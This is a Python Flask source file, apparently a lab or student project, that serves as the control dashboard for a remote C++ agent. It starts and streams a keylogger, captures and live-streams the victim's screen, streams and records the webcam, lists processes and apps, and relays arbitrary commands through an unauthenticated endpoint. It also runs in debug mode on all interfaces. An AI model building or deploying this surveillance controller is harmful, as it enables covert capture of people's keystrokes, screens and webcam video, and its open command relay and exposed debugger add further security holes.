import socket
import struct
import time
import json
import os
import threading
import cv2
import numpy as np
import traceback
import psutil
import logging
from flask import Flask, render_template, request, jsonify, Response
from datetime import datetime
app = Flask(__name__)

class SuppressAutoRefreshFilter(logging.Filter):
    def filter(self, record):
        suppress_paths = ['/api/system/stats', '/api/keylog/stats', '/api/apps/recent', '/api/screenshot']
        return not any(path in record.getMessage() for path in suppress_paths)

werkzeug_logger = logging.getLogger('werkzeug')
werkzeug_logger.addFilter(SuppressAutoRefreshFilter())

# --- CẤU HÌNH KẾT NỐI ---
VM_IP = "127.0.0.1"

COMMAND_PORT = 8888
DATA_PORT = 8889
LIVESTREAM_PORT = 8890
KEYLOG_PORT = 8891

HEADER_FORMAT = '>HHIIIII'
HEADER_SIZE = 24

# Global persistent socket connections
_cmd_socket = None
_data_socket = None
_socket_lock = threading.Lock()
_cmd_lock = threading.Lock()

_keylog_stats = {
    'total_keys': 0,
    'session_keys': 0,
    'last_activity': None,
    'is_running': False
}

def get_persistent_sockets():
    """Get or create persistent socket connections"""
    global _cmd_socket, _data_socket
    
    with _socket_lock:
        try:
            # Test if sockets are still alive
            if _cmd_socket:
                _cmd_socket.setblocking(False)
                try:
                    data = _cmd_socket.recv(1, socket.MSG_PEEK)
                    if len(data) == 0:
                        raise Exception("Socket closed")
                except socket.error as e:
                    if e.errno not in [socket.EAGAIN, socket.EWOULDBLOCK]:
                        raise
                _cmd_socket.setblocking(True)
            
            # Create new connections if needed
            if _cmd_socket is None:
                print("[DEBUG] Creating new command socket connection")
                _cmd_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                _cmd_socket.connect((VM_IP, COMMAND_PORT))
                print("[DEBUG] Command socket connected")
            
            if _data_socket is None:
                print("[DEBUG] Creating new data socket connection")
                _data_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                _data_socket.connect((VM_IP, DATA_PORT))
                print("[DEBUG] Data socket connected")
                
        except Exception as e:
            print(f"[ERROR] Socket connection failed: {e}")
            # Close and reset sockets on error
            if _cmd_socket:
                try:
                    _cmd_socket.close()
                except:
                    pass
                _cmd_socket = None
            if _data_socket:
                try:
                    _data_socket.close()
                except:
                    pass
                _data_socket = None
            raise
    
    return _cmd_socket, _data_socket

def send_command_packet(cmd_str):
    """Gửi lệnh ngắn tới Server C++"""
    try:
        cmd_sock, _ = get_persistent_sockets()
        cmd_sock.settimeout(3)
        cmd_sock.sendall(cmd_str.encode())
        try:
            response = cmd_sock.recv(4096).decode('utf-8', errors='ignore')
            return response.strip()
        except socket.timeout:
            return "Command sent (No ACK)"
    except Exception as e:
        print(f"Lỗi gửi lệnh '{cmd_str}': {e}")
        return f"Error: {str(e)}"

def receive_large_data(trigger_cmd, silent=False):
    """Gửi lệnh và nhận dữ liệu lớn (CSV, Ảnh) từ cổng Data"""
    try:
        cmd_sock, data_sock = get_persistent_sockets()
        
        # B1: Gửi lệnh qua Command socket
        with _cmd_lock:
            cmd_sock.sendall(trigger_cmd.encode())
        
        if not silent:
            print(f"[DEBUG] Sent command: {trigger_cmd}")
        
        # Chờ server xử lý
        time.sleep(0.2 if silent else 0.3)

        # B2: Sử dụng data socket đã kết nối
        data_sock.settimeout(10 if silent else 15)
        
        # B3: Nhận data
        full_payload = bytearray()
        chunks_received = 0
        
        while True:
            # Đọc Header (24 bytes)
            header_data = b''
            while len(header_data) < HEADER_SIZE:
                packet = data_sock.recv(HEADER_SIZE - len(header_data))
                if not packet:
                    break
                header_data += packet
            
            if len(header_data) < HEADER_SIZE:
                if chunks_received == 0:
                    if not silent:
                        print(f"[ERROR] No header data received")
                    return None
                break
            
            # Giải mã Header - Big-endian network byte order
            try:
                cmd, res, total, curr, size, total_size, checksum = struct.unpack('>HHIIIII', header_data)
                
                if not silent and chunks_received == 0:
                    print(f"[DEBUG] Header: cmd={cmd}, total={total}, curr={curr}, size={size}")
            except struct.error as e:
                if not silent:
                    print(f"[ERROR] Failed to unpack header: {e}")
                return None
            
            # VALIDATION
            MAX_CHUNK_SIZE = 5 * 1024 * 1024
            if size > MAX_CHUNK_SIZE or size <= 0:
                if not silent:
                    print(f"[ERROR] Invalid chunk size: {size} bytes")
                return None
            
            # Đọc dữ liệu Chunk
            if not silent:
                print(f"[DEBUG] Reading chunk {curr+1}/{total}, size={size} bytes...")
            
            chunk_data = b''
            while len(chunk_data) < size:
                remaining = size - len(chunk_data)
                to_read = min(65536, remaining)
                
                try:
                    packet = data_sock.recv(to_read)
                    if not packet:
                        break
                    chunk_data += packet
                        
                except socket.timeout:
                    if not silent:
                        print(f"[ERROR] Socket timeout reading chunk data")
                    return None
            
            if len(chunk_data) != size:
                if not silent:
                    print(f"[ERROR] Incomplete chunk: expected {size}, got {len(chunk_data)} bytes")
                return None
            
            full_payload.extend(chunk_data)
            chunks_received += 1
            
            if not silent:
                print(f"[SUCCESS] Chunk {curr+1}/{total} complete ({len(chunk_data)} bytes)")
            
            if curr >= total - 1:
                break
        
        # B4: Đọc response từ cmd_sock
        try:
            cmd_sock.settimeout(0.1)
            response = cmd_sock.recv(4096)
            if not silent:
                print(f"[DEBUG] Server response: {response.decode('utf-8', errors='ignore').strip()}")
        except socket.timeout:
            pass
        
        if len(full_payload) > 0:
            if not silent:
                print(f"[FINAL] Returning {len(full_payload)} bytes")
            return full_payload
        else:
            if not silent:
                print(f"[FINAL] No payload received")
            return None
        
    except socket.timeout as e:
        if not silent:
            print(f"[ERROR] Socket timeout: {e}")
        return None
    except Exception as e:
        if not silent:
            print(f"[ERROR] Exception: {e}")
            traceback.print_exc()
        
        # Reset connections on error
        global _cmd_socket, _data_socket
        with _socket_lock:
            if _cmd_socket:
                try:
                    _cmd_socket.close()
                except:
                    pass
                _cmd_socket = None
            if _data_socket:
                try:
                    _data_socket.close()
                except:
                    pass
                _data_socket = None
        
        return None
    
# --- API ROUTES ---

@app.route('/')
def index():
    return render_template('dashboard.html', ip=VM_IP)

@app.route('/api/ping')
def ping():
    """Kiểm tra kết nối tới Server"""
    res = send_command_packet("PING")
    if "Error" not in res:
        return jsonify({'status': 'online'})
    return jsonify({'status': 'offline'})

@app.route('/api/<type>')
def list_items(type):
    """Lấy danh sách Process hoặc App"""
    cmd = "PROCESS_LIST" if type == 'processes' else "APP_LIST"
    raw_data = receive_large_data(cmd)
    
    if not raw_data: 
        return jsonify([])

    try:
        text = raw_data.decode('utf-8', errors='ignore')
        lines = text.split('\n')
        data = []
        
        for line in lines[1:]:
            parts = line.split(',')
            if type == 'processes' and len(parts) >= 5:
                data.append({
                    'name': parts[0].strip('"'),
                    'pid': parts[1].strip('"'),
                    'mem': parts[4].strip('"')
                })
            elif type == 'apps' and len(parts) >= 4:
                data.append({
                    'name': parts[1].strip('"'),
                    'version': parts[2].strip('"'),
                    'publisher': parts[3].strip('"')
                })
        return jsonify(data)
    except Exception as e:
        print(f"Parse error: {e}")
        return jsonify([])

@app.route('/api/control', methods=['POST'])
def control_action():
    """Xử lý các lệnh Start/Stop/Power"""
    req = request.json
    cmd = req.get('cmd')
    arg = req.get('arg', '')
    
    cmd_str = cmd
    if arg:
        cmd_str = f"{cmd} {arg}"
        
    resp = send_command_packet(cmd_str)
    return jsonify({'response': resp})

@app.route('/api/screenshot')
def screenshot():
    """Chụp màn hình"""
    # Check if this is for saving or just viewing
    save_to_disk = request.args.get('save', 'true').lower() == 'true'
    
    img_bytes = receive_large_data("SCREEN_CAPTURE")
    if img_bytes:
        # Chỉ lưu file khi được yêu cầu rõ ràng
        if save_to_disk:
            os.makedirs('screenshots', exist_ok=True)
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f'screenshots/screenshot_{timestamp}.jpg'
            
            with open(filename, 'wb') as f:
                f.write(img_bytes)
            print(f"[SAVED] Screenshot saved to {filename}")
        
        return Response(bytes(img_bytes), mimetype='image/jpeg')
    return "Error capturing screen", 500

# --- WEBCAM STREAMING (MJPEG) ---

def webcam_stream():
    send_command_packet("LIVESTREAM")
    time.sleep(1) 
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((VM_IP, LIVESTREAM_PORT))
        
        while True:
            size_data = sock.recv(4)
            if not size_data: break
            
            size = struct.unpack('i', size_data)[0]
            if size > 10000000: continue
            
            img_data = b''
            while len(img_data) < size:
                packet = sock.recv(size - len(img_data))
                if not packet: break
                img_data += packet
                
            yield (b'--frame\r\n'
                   b'Content-Type: image/jpeg\r\n\r\n' + img_data + b'\r\n')
    except Exception as e:
        print(f"Webcam Error: {e}")

# Global biến để lưu video
_video_writer = None
_is_recording = False

@app.route('/api/webcam/record', methods=['POST'])
def webcam_record():
    """Bắt đầu/dừng ghi video"""
    global _is_recording, _video_writer
    action = request.json.get('action')
    
    if action == 'start':
        _is_recording = True
        print("[RECORDING] Recording enabled")
        return jsonify({'status': 'Recording started - video will be saved to recordings folder'})
    else:
        _is_recording = False
        if _video_writer:
            _video_writer.release()
            _video_writer = None
            print("[RECORDING] Recording stopped and saved")
        return jsonify({'status': 'Recording stopped - video saved successfully'})


def webcam_stream():
    global _video_writer, _is_recording
    
    send_command_packet("LIVESTREAM")
    time.sleep(1)
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((VM_IP, LIVESTREAM_PORT))
        
        # Khởi tạo video writer khi bắt đầu record
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        os.makedirs('recordings', exist_ok=True)
        video_path = f'recordings/webcam_{timestamp}.avi'
        
        while True:
            size_data = sock.recv(4)
            if not size_data: break
            
            size = struct.unpack('i', size_data)[0]
            if size > 10000000: continue
            
            img_data = b''
            while len(img_data) < size:
                packet = sock.recv(size - len(img_data))
                if not packet: break
                img_data += packet
            
            # Lưu frame vào video nếu đang record
            if _is_recording and img_data:
                # Decode JPEG thành numpy array
                nparr = np.frombuffer(img_data, np.uint8)
                frame = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
                
                if frame is not None:
                    # Khởi tạo writer lần đầu (cần biết kích thước frame)
                    if _video_writer is None:
                        h, w = frame.shape[:2]
                        _video_writer = cv2.VideoWriter(video_path, fourcc, 20.0, (w, h))
                        print(f"[RECORDING] Started recording to {video_path}")
                    
                    _video_writer.write(frame)
                
            yield (b'--frame\r\n'
                   b'Content-Type: image/jpeg\r\n\r\n' + img_data + b'\r\n')
                   
    except Exception as e:
        print(f"Webcam Error: {e}")
    finally:
        if _video_writer:
            _video_writer.release()
            _video_writer = None

@app.route('/video_feed')
def video_feed():
    return Response(webcam_stream(), mimetype='multipart/x-mixed-replace; boundary=frame')

def screen_stream():
    """Stream màn hình real-time (MJPEG)"""
    send_command_packet("LIVESTREAM")  # Reuse livestream command hoặc tạo SCREENSTREAM riêng
    time.sleep(0.5)
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((VM_IP, LIVESTREAM_PORT))  # Hoặc tạo SCREEN_PORT riêng
        
        while True:
            # Request screenshot từ C++ server
            # C++ sẽ gửi JPEG frames liên tục qua DATA_PORT
            size_data = sock.recv(4)
            if not size_data: break
            
            size = struct.unpack('i', size_data)[0]
            if size > 10000000: continue
            
            img_data = b''
            while len(img_data) < size:
                packet = sock.recv(size - len(img_data))
                if not packet: break
                img_data += packet
                
            yield (b'--frame\r\n'
                   b'Content-Type: image/jpeg\r\n\r\n' + img_data + b'\r\n')
    except Exception as e:
        print(f"Screen Stream Error: {e}")


@app.route('/api/screen/stream', methods=['POST'])
def screen_stream_control():
    """Start/Stop screen streaming"""
    action = request.json.get('action')
    if action == 'start':
        send_command_packet("SCREENSTREAM")
        return jsonify({'status': 'Screen streaming started'})
    else:
        send_command_packet("STOPSCREENSTREAM")
        return jsonify({'status': 'Screen streaming stopped'})

@app.route('/screen_feed')
def screen_feed():
    """Stream màn hình real-time với polling"""
    return Response(screen_stream_simple(), mimetype='multipart/x-mixed-replace; boundary=frame')

def screen_stream_simple():
    """Stream màn hình bằng cách gọi SCREEN_CAPTURE liên tục"""
    import time
    
    fps = 10  # 10 FPS
    delay = 1.0 / fps
    frame_count = 0
    
    print("[SCREEN_STREAM] Starting screen stream...")
    
    while True:
        try:
            start_time = time.time()
            
            # Capture screen với receive_large_data_silent
            img_bytes = receive_large_data("SCREEN_CAPTURE", silent=True)
            
            if img_bytes and len(img_bytes) > 0:
                frame_count += 1
                # Log every 50 frames
                if frame_count % 50 == 0:
                    print(f"[SCREEN_STREAM] Streaming... ({frame_count} frames, {len(img_bytes)} bytes/frame)")
                
                yield (b'--frame\r\n'
                       b'Content-Type: image/jpeg\r\n\r\n' + bytes(img_bytes) + b'\r\n')
            else:
                # Chỉ log mỗi 10 lần thất bại để tránh spam
                if frame_count == 0 or frame_count % 10 == 0:
                    print(f"[SCREEN_STREAM] No data received (attempt #{frame_count}), retrying...")
                time.sleep(0.5)
                continue
            
            # Maintain FPS
            elapsed = time.time() - start_time
            sleep_time = max(0, delay - elapsed)
            time.sleep(sleep_time)
            
        except GeneratorExit:
            print(f"[SCREEN_STREAM] Client disconnected (streamed {frame_count} frames)")
            break
        except Exception as e:
            print(f"[SCREEN_STREAM] Error: {e}")
            import traceback
            traceback.print_exc()
            time.sleep(1)


# --- KEYLOGGER STATS TRACKING ---

@app.route('/api/webcam/off', methods=['POST'])
def webcam_off():
    global _video_writer, _is_recording
    
    # Dừng recording nếu đang quay
    if _is_recording:
        _is_recording = False
        if _video_writer:
            _video_writer.release()
            _video_writer = None
    
    # Gửi lệnh stop stream về server
    send_command_packet("STOPLIVESTREAM")
    print("[STREAM] Stream stopped by user")
    return jsonify({'status': 'Stream stopped successfully'})

# --- KEYLOGGER STREAMING (SSE) ---
@app.route('/api/keylog/toggle', methods=['POST'])
def keylog_toggle():
    global _keylog_stats
    
    state = request.json.get('state')
    cmd = "KEYLOG" if state else "STOPKEYLOG"
    
    if state:
        _keylog_stats['session_keys'] = 0
        _keylog_stats['is_running'] = True
    else:
        _keylog_stats['is_running'] = False
    
    send_command_packet(cmd)
    time.sleep(0.5)
    
    return jsonify({'status': 'ok'})

@app.route('/api/keylog/stream')
def stream_keys():
    global _keylog_stats
    
    def events():
        max_retries = 10
        sock = None
        
        for retry_count in range(max_retries):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((VM_IP, KEYLOG_PORT))
                sock.settimeout(None)
                print(f"[KEYLOG] Connected on attempt {retry_count + 1}")
                _keylog_stats['is_running'] = True
                break
            except Exception as e:
                print(f"[KEYLOG] Attempt {retry_count + 1}/{max_retries} failed: {e}")
                if sock:
                    try:
                        sock.close()
                    except:
                        pass
                    sock = None
                
                if retry_count < max_retries - 1:
                    time.sleep(1)
                else:
                    yield "data: [ERROR] Cannot connect after 10 attempts\n\n"
                    return
        
        try:
            while True:
                data = sock.recv(1024)
                if not data:
                    break
                
                decoded = data.decode(errors='ignore')
                
                # Track keystroke count
                key_count = decoded.count('[')
                _keylog_stats['total_keys'] += key_count
                _keylog_stats['session_keys'] += key_count
                _keylog_stats['last_activity'] = datetime.now()
                
                yield f"data: {decoded}\n\n"
                    
        except Exception as e:
            print(f"[KEYLOG ERROR] {e}")
        finally:
            _keylog_stats['is_running'] = False
            if sock:
                try:
                    sock.close()
                except:
                    pass
            yield "data: [DISCONNECTED]\n\n"
    
    return Response(events(), mimetype="text/event-stream")

@app.route('/api/keylog/stats')
def keylog_stats():
    """Lấy thống kê keylogger"""
    global _keylog_stats
    
    last_activity_str = "Never"
    if _keylog_stats['last_activity']:
        delta = datetime.now() - _keylog_stats['last_activity']
        if delta.seconds < 60:
            last_activity_str = f"{delta.seconds}s ago"
        elif delta.seconds < 3600:
            last_activity_str = f"{delta.seconds // 60}m ago"
        else:
            last_activity_str = f"{delta.seconds // 3600}h ago"
    
    return jsonify({
        'is_running': _keylog_stats['is_running'],
        'total_keys': _keylog_stats['total_keys'],
        'session_keys': _keylog_stats['session_keys'],
        'last_activity': last_activity_str
    })

@app.route('/api/system/stats')
def system_stats():
    """Lấy thống kê hệ thống từ C++ server."""
    try:
        response = send_command_packet("SYSTEM_STATS")
        if not response or "Error" in response:
            raise Exception(f"Invalid response: {response}")

        try:
            first_brace = response.find('{')
            if first_brace != -1:
                json_text = response[first_brace:]
            else:
                json_text = response

            stats = json.loads(json_text)
            return jsonify(stats)
        except Exception as je:
            if "CHUNKED" in response:
                raw = receive_large_data("SYSTEM_STATS")
                if raw:
                    try:
                        stats = json.loads(raw.decode('utf-8', errors='ignore'))
                        return jsonify(stats)
                    except Exception as je2:
                        raise

            raise Exception(f"Invalid JSON from C++: {response}")
    except Exception as e:
        # Fallback local stats
        cpu_percent = psutil.cpu_percent(interval=0.1)
        mem = psutil.virtual_memory()
        mem_used_gb = mem.used / (1024**3)
        mem_total_gb = mem.total / (1024**3)

        boot_time = psutil.boot_time()
        uptime_seconds = time.time() - boot_time
        uptime_hours = int(uptime_seconds // 3600)
        uptime_minutes = int((uptime_seconds % 3600) // 60)

        disk = psutil.disk_usage('/')
        disk_used_gb = disk.used / (1024**3)
        disk_total_gb = disk.total / (1024**3)

        net_io = psutil.net_io_counters()

        return jsonify({
            'cpu_percent': round(cpu_percent, 1),
            'mem_used_gb': round(mem_used_gb, 1),
            'mem_total_gb': round(mem_total_gb, 1),
            'mem_percent': round(mem.percent, 1),
            'uptime': f"{uptime_hours}h {uptime_minutes}m",
            'process_count': len(psutil.pids()),

            'disk_used_gb': round(disk_used_gb, 1),
            'disk_total_gb': round(disk_total_gb, 1),
            'disk_percent': round(disk.percent, 1),
            'net_sent_mb': round(net_io.bytes_sent / (1024**2), 1),
            'net_recv_mb': round(net_io.bytes_recv / (1024**2), 1)
        })

@app.route('/api/apps/recent')
def recent_apps():
    """Lấy danh sách apps gần đây"""
    recent = [
        {'name': 'Chrome', 'icon': 'fa-brands fa-chrome', 'path': 'chrome.exe'},
        {'name': 'VS Code', 'icon': 'fa-solid fa-code', 'path': 'code.exe'},
        {'name': 'Terminal', 'icon': 'fa-solid fa-terminal', 'path': 'cmd.exe'},
        {'name': 'Discord', 'icon': 'fa-brands fa-discord', 'path': 'discord.exe'}
    ]
    return jsonify(recent)

@app.route('/api/network/stats')
def network_stats():
    """Lấy thống kê mạng"""
    try:
        net_io = psutil.net_io_counters()
        
        # Calculate speed (bytes/sec) - requires tracking previous values
        global _last_net_io, _last_net_time
        current_time = time.time()
        
        if '_last_net_io' not in globals():
            _last_net_io = net_io
            _last_net_time = current_time
            download_speed = 0
            upload_speed = 0
        else:
            time_delta = current_time - _last_net_time
            download_speed = (net_io.bytes_recv - _last_net_io.bytes_recv) / time_delta
            upload_speed = (net_io.bytes_sent - _last_net_io.bytes_sent) / time_delta
            _last_net_io = net_io
            _last_net_time = current_time
        
        return jsonify({
            'download_speed_mb': round(download_speed / (1024*1024), 2),
            'upload_speed_mb': round(upload_speed / (1024*1024), 2),
            'total_sent_gb': round(net_io.bytes_sent / (1024**3), 2),
            'total_recv_gb': round(net_io.bytes_recv / (1024**3), 2),
            'packets_sent': net_io.packets_sent,
            'packets_recv': net_io.packets_recv,
            'connections': len(psutil.net_connections())
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001, debug=True)